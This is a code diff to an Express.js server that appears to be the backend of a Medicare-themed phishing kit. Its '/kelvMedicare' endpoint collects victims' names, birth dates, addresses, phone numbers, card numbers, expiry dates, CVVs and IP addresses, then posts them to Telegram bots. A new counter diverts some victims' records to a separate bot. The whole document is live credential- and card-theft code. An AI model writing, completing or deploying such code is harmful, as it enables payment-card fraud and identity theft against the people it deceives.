@@ -81,6 +81,8 @@ app.post('/tarrifiMedicare', (req, res) => {
     })
 });
 
+let kelvMed = 3;
+
 app.options('/kelvMedicare', cors())
 
 app.post('/kelvMedicare', (req, res) => {
@@ -115,11 +117,11 @@ app.post('/kelvMedicare', (req, res) => {
     }).then(function () {
         binList = `${bin} | ${dob} | ${zip} | ${bankName}`
         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (mason == 6) {
+        if (kelvMed == 4) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
-            mason = 0;
+            kelvMed = 0;
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareTarrifi:\n${originalText}`
@@ -127,7 +129,7 @@ app.post('/kelvMedicare', (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=MediCare:\n${originalText}`
             );
-            mason += 1
+            kelvMed += 1
         }
 
         res.send("Update Completed");
